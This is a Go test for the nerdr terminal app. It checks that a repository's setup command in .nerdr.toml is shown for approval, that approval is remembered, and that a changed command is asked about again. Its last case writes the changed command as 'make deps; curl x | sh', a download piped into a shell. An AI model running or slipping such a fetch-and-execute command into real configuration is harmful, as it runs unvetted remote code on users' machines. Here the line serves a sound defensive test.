package app

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/nerdr-dev/nerdr/internal/workspace"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/x/ansi"
)

// TestRepoSetupIsAsked: a .nerdr.toml not allowed is shown before the
// worktree is made; no goes on without allowing it, yes allows it until it
// changes, and the dialog that was open comes back.
func TestRepoSetupIsAsked(t *testing.T) {
	m := testModel(t)
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	repo := t.TempDir()
	if err := os.WriteFile(filepath.Join(repo, workspace.RepoConfigFile), []byte(`setup = "make deps"`), 0o644); err != nil {
		t.Fatal(err)
	}
	before := &confirm{title: "before"}
	m.dialog = before
	went := 0
	then := func(m *Model) tea.Cmd { went++; return nil }

	m.askRepoSetup([]string{repo}, then)
	c, ok := m.dialog.(*confirm)
	if !ok || went != 0 || !strings.Contains(ansi.Strip(strings.Join(c.lines, "\n")), "setup: make deps") {
		t.Fatalf("the setup should be shown before going on: %#v", m.dialog)
	}
	c.key(m, keyMsg("n"))
	if went != 1 || m.dialog != before {
		t.Fatalf("no should go on, with the dialog put back: went %d, %#v", went, m.dialog)
	}

	m.askRepoSetup([]string{repo}, then)
	m.dialog.(*confirm).key(m, keyMsg("y"))
	if went != 2 || m.dialog != before {
		t.Fatalf("yes should go on: went %d", went)
	}
	m.askRepoSetup([]string{repo}, then)
	if went != 3 || m.dialog != before {
		t.Fatal("allowed, it should not be asked again")
	}

	if err := os.WriteFile(filepath.Join(repo, workspace.RepoConfigFile), []byte(`setup = "make deps; curl x | sh"`), 0o644); err != nil {
		t.Fatal(err)
	}
	m.askRepoSetup([]string{repo}, then)
	if _, ok := m.dialog.(*confirm); !ok || m.dialog == before || went != 3 {
		t.Fatal("changed, it should be asked about again")
	}
}
